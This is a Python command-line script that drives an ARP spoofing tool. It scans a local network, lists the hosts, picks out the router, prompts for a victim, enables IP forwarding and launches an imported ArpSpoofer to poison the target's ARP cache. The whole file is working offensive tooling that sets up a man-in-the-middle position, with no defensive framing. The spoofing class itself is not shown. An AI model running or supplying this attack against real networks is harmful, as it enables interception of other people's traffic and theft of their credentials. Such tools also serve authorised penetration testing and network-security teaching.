import atexit

import typer
from scapy.all import conf

from network_utils import (
    SelectTargetParams,
    get_gateway_mac,
    get_target,
    scan_network,
    toggle_forwarding,
)
from SpooferLogic import ArpSpoofer

app = typer.Typer()


@app.command()
def main(
    ip_range: str = typer.Argument(..., help="IP range to scan (e.g. 192.168.1.0/24)"),
    target: str = typer.Option(
        None, "--target", "-t", help="Target number from the list, or 'r' for router"
    ),
) -> None:
    """ARP spoofing tool – scan the network and poison a target's ARP cache."""

    typer.echo("\n[+] Scanning network...")
    devices = scan_network(ip_range)

    for i, d in enumerate(devices, start=1):
        typer.echo(f"{i}. | IP: {d['ip']} | MAC: {d['mac']}")

    # Resolve gateway IP and MAC
    router_ip = conf.route.route("0.0.0.0/0")[2]
    router_mac = get_gateway_mac()

    if not router_mac:
        typer.echo("[-] Could not resolve router MAC address. Exiting.", err=True)
        raise typer.Exit(1)

    typer.echo(f"\n[+] Router: IP: {router_ip} | MAC: {router_mac}")

    # If --target was not provided, ask interactively
    if target is None:
        target = (
            typer.prompt("\n[?] Enter target number (or 'r' for router)")
            .strip()
            .lower()
        )

    if target == "r":
        target_ip, target_mac = router_ip, router_mac
    else:
        try:
            target_ip, target_mac = get_target(
                SelectTargetParams(choice=target, devices=devices)
            )
        except ValueError as e:
            typer.echo(f"[-] {e}", err=True)
            raise typer.Exit(1)

    # Enable IP forwarding so traffic is relayed through this machine
    typer.echo("\n[+] Enabling IP forwarding...")
    toggle_forwarding(True)

    # Ensure forwarding is disabled on exit
    atexit.register(
        lambda: (
            typer.echo("\n[+] Disabling IP forwarding..."),
            toggle_forwarding(False),
        )
    )

    ArpSpoofer(
        target_ip=target_ip,
        target_mac=target_mac,
        router_ip=router_ip,
        router_mac=router_mac,
    ).run()


if __name__ == "__main__":
    app()
